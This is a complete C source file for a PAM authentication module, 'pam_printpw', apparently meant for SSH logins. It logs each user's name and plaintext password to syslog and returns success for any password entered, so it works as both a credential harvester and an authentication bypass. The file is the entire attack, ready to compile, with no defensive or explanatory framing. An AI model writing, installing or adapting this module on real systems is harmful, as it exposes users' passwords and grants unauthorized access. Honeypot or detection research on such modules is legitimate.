#define PAM_SM_AUTH
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include <syslog.h>
#include <stdarg.h>

static void _pam_log(int err, const char *format, ...) {
   va_list args;

   va_start(args, format);
   openlog("pam_printpw", LOG_CONS|LOG_PID, LOG_AUTH);
   vsyslog(err, format, args);
   va_end(args);
   closelog();
}

/* PAM entry point for authentication verification */
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  char *username;
  char *password;

  pam_get_item(pamh, PAM_USER, (void*) &username);
  pam_get_item(pamh, PAM_AUTHTOK, (void*) &password);

  if (!username || !password) {
    _pam_log(LOG_ERR, "cannot find username or password...");
		return PAM_AUTHINFO_UNAVAIL;
	}

  _pam_log(LOG_DEBUG, "ssh auth attempt: %s entered the password %s", username, password);

	return(PAM_SUCCESS);
}

int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return(PAM_IGNORE);
}
